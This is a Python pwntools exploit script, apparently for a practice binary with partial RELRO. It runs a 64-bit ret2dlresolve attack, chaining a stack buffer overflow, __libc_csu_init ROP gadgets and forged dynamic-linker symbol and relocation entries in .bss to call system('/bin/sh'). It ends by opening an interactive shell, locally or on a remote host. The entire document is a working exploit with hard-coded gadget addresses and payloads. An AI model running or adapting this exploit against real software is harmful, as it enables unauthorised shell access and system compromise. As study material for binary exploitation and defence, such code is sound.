from pwn import *
import math

g_fname = args.FNAME if (args.FNAME) else "./main_partial_relro_64"
g_elf = ELF(g_fname)
context.binary = g_elf

if (args.LOCAL):
	g_io = process(g_fname)
else:
	h, p = args.RHOST.split(':')
	g_io = remote(h, p)

def getpid():
	if (args.LOCAL):
		log.info("pid:%d\n", g_io.proc.pid)
		pause()

def get_shaddr(elfobj, sec_name):
	return elfobj.get_section_by_name(sec_name)["sh_addr"]

def get_aligned_addr(base_addr, unaligned_addr, alignment):
	assert(base_addr <= unaligned_addr)
	off = unaligned_addr - base_addr
	idx = math.ceil(off / alignment)
	return base_addr + idx*alignment

def rop2read(buf, cnt):
	got_read = g_elf.got["read"]
	# mov %r15, %rdx; mov %r14, %rsi; mov %r13d, %edi;
	# callq *(%r12, %rbx, 8)
	# add $1, %rbx; cmp %rbx, %rbp; jne 0x400780;
	# add $8, %rsp; 
	# csu_end: ...
	addr_csu_front = 0x400780
	# pop %rbx; pop %rbp; pop %r12~%r15; ret
	addr_csu_end = 0x40079a
	payload = flat([
		addr_csu_end, 
		0, # rbx
		1, # rbp,
		got_read, # r12
		0, # r13->edi, 0 means read from stdin
		buf, # r14->rsi
		cnt, # r15->rdx
		addr_csu_front,
		p64(0) * 7
	])
	return payload

def pwn():
	# segment writable [0x601000, 0x602000)
	# .bss [0x601050, 0x601070)
	bss_addr = g_elf.bss()
	# data_addr = 0x601070
	data_addr = bss_addr + 0x20 
	binsh_addr = data_addr
	fake_dynstr_addr = binsh_addr + 8
	# The following 2 addrs are uninitialized and need be aligned.
	fake_reloc_addr = 0
	fake_refsym_addr = 0
	new_stk = 0
	sh = "/bin/sh\0"
	str_sym_name = "system\0"

	log.debug("\"%s\"@%#x\n\t\"%s\"@%#x\n", sh, binsh_addr, str_sym_name, fake_dynstr_addr)

	dynstr_shaddr = get_shaddr(g_elf, ".dynstr")
	dynsym_shaddr = get_shaddr(g_elf, ".dynsym")
	relplt_shaddr = get_shaddr(g_elf, ".rela.plt")
	log.debug(".dynstr@%#x\n\t.dynsym@%#x\n\t.rela.plt@%#x\n"
		, dynstr_shaddr
		, dynsym_shaddr
		, relplt_shaddr
	)

	# make sure fake_refsym_off % sizeof(Elf64_Sym) == 0,
	# that is fake_refsym_off % 24 == 0
	fake_refsym_addr = fake_dynstr_addr + len(str_sym_name)
	fake_refsym_addr = get_aligned_addr(dynsym_shaddr, fake_refsym_addr, 24)
	fake_refsym_off = fake_refsym_addr - dynsym_shaddr
	fake_refsym_idx = fake_refsym_off // 24
	log.debug("fake_refsym_addr=%#x\n\tfake_refsym_off=%#x\n\tfake_refsym_idx=%#x\n"
		, fake_refsym_addr
		, fake_refsym_off
		, fake_refsym_idx
	)

	# 64-bit version: make sure fake_reloc_off % sizeof(Elf64_Rela) == 0,
	# that is fake_reloc_off % 24 == 0
	fake_reloc_addr = fake_refsym_addr + 24 # fake Elf64_Rela object behind fake Elf64_Sym object.
	fake_reloc_addr = get_aligned_addr(relplt_shaddr, fake_reloc_addr, 24)
	fake_reloc_off = fake_reloc_addr - relplt_shaddr
	fake_reloc_idx = fake_reloc_off // 24 # This is _dl_fixup()'s reloc_arg in 64-bit version.
	log.debug("fake_reloc_addr=%#x\n\tfake_reloc_off=%#x\n\tfake_reloc_idx=%#x\n"
		, fake_reloc_addr
		, fake_reloc_off
		, fake_reloc_idx
	)

	fake_dynstr_off = fake_dynstr_addr - dynstr_shaddr	
	log.debug("fake_dynstr_addr=%#x\n\tfake_dynstr_off=%#x\n", fake_dynstr_addr, fake_dynstr_off)

	# forge fake Elf64_Sym object
	# typedef struct
	# {
	#	Elf64_Word st_name;		/*Symbol name(string tbl index)*/
	#	unsigned char st_info;  	/*Symbol type and binding*/
	#	unsigned char st_other;	/*Symbol visibility*/
	#	Elf64_Section st_shndx;	/*Section index*/
	#	Elf64_Addr st_value;  	/*Symbol value*/
	#	Elf64_Xword st_size;  	/*Symbol size*/
	# }	Elf64_Sym;
	# sizeof(Elf64_Sym) == 24
	st_name = fake_dynstr_off
	st_info = 0x12
	st_other = 0
	st_shndx = 0 # SHN_UNDEF, undefined symbol, symbol refered in current module but defined in another.
	st_value = 0
	st_size = 0
	fake_sym_obj = flat([
		st_name | (st_info << 32) | (st_other << 40) | (st_shndx << 48),
		st_value,
		st_size
	])	
	log.debug("fake_sym_obj:\n\tlength=%d\n", len(fake_sym_obj))


	# forge fake Elf64_Rela object
	fake_symidx = fake_refsym_off // len(fake_sym_obj)
	r_offset = 0x601018
	r_info = (fake_symidx << 32) | 0x7
	fake_reloc_obj = flat(r_offset, r_info, 0)
	log.debug("fake_reloc_obj:\n\tlength=%d\n\tfake_symidx=%#x\n"
		, len(fake_reloc_obj)
		, fake_symidx
	)

	full_data_payload = flat({
		0:sh,
		8:str_sym_name,
		(fake_refsym_addr - data_addr): fake_sym_obj,
		(fake_reloc_addr - data_addr): fake_reloc_obj
	})
	log.debug("full_data_payload's length = %d\n", len(full_data_payload))

	# Ready to rop!!!
	vuln_addr = 0x400637
	bof_padding = 'a'*0x78
	payload_read_data_to_bss = rop2read(data_addr, len(full_data_payload))
	payload_rop2read = flat([
		bof_padding,
		payload_read_data_to_bss,
		vuln_addr # bof again
	])
	log.debug("length of payload_rop2read = %#x\n", len(payload_rop2read))
	assert(len(payload_rop2read) <= 0x100)

	getpid()
	# 1st send: rop to read(0, addr_at_bss, count), preparing for ret2dl-resolve.
	g_io.send(payload_rop2read)

	# 2nd send: write full_data_payload to .bss
	g_io.send(full_data_payload)

	p_rdi = 0x4007a3 # pop rdi; ret
	plt0_addr = 0x400500
	payload_dlresolve = flat([
		bof_padding,
		plt0_addr, 
		fake_reloc_idx,
		p_rdi,
		binsh_addr, 
		0xdeadbeef # where the system() may return.
	])
	log.debug("length of payload_dlresolve = %#x\n", len(payload_dlresolve))
	assert(len(payload_dlresolve) <= 0x100)
	# 3rd send: ret2dlresolve end get shell.
	g_io.send(payload_dlresolve)


if ("__main__" == __name__):
	if (args.DEBUG):
		context.log_level = "debug"
	pwn()
	g_io.interactive()
